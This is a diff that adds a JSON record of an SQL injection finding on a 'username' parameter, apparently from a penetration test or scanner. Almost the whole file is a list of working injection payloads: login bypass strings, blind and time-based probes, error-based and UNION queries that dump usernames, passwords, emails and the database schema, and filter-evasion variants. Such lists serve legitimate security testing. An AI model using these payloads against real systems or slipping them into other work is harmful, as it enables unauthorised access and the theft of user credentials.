@@ -1,0 +1,48 @@
+{
+  "finding": "sql_injection",
+  "parameter": "username",
+  "payloads": [
+
+    "' OR '1'='1",
+    "' OR '1'='1' OR '1'='1",
+    "' OR 'x'='x",
+    "') OR ('1'='1",
+    "admin'-- -",
+
+    "' OR 1=1-- -",
+    "' OR 1=2-- -",
+    "' AND 1=1-- -",
+    "' AND 1=2-- -",
+    "' AND substring(username,1,1)='a'-- -",
+
+    "' AND (SELECT 1 FROM (SELECT(randomblob(500000000)))t)-- -",
+    "' AND (SELECT 1 FROM (SELECT(randomblob(999999999)))t)-- -",
+    "' OR (SELECT CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END)-- -",
+
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
+    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -",
+    "' AND 1=CAST((SELECT group_concat(username) FROM users) AS INTEGER)-- -",
+    "' AND 1=CAST((SELECT sqlite_version()) AS INTEGER)-- -",
+
+    "' UNION SELECT 1,group_concat(username||':'||password),3,4 FROM users-- -",
+    "' UNION SELECT 1,group_concat(username),3,4 FROM users-- -",
+    "' UNION SELECT 1,group_concat(email),3,4 FROM users-- -",
+    "' UNION SELECT 1,sqlite_version(),3,4-- -",
+    "' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'-- -",
+    "' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='users'-- -",
+
+    "' UNION SELECT 1,hex(password),3,4 FROM users WHERE username=char(97,100,109,105,110)-- -",
+    "' UNION SELECT 1,hex(username||':'||password),3,4 FROM users LIMIT 1-- -",
+    "' OR 1=1 LIMIT 1 OFFSET 0-- -",
+
+    "' UN/**/ION SE/**/LECT 1,group_concat(username),3,4 FROM users-- -",
+    "' /*!50000OR*/ '1'='1",
+    "' UN%09ION SEL%09ECT 1,group_concat(username),3,4 FROM users-- -",
+
+    "'' OR ''=''",
+    "' OR 'unusual'='unusual",
+    "'||'1'='1",
+    "' OR 1 LIKE 1-- -"
+
+  ]
+}
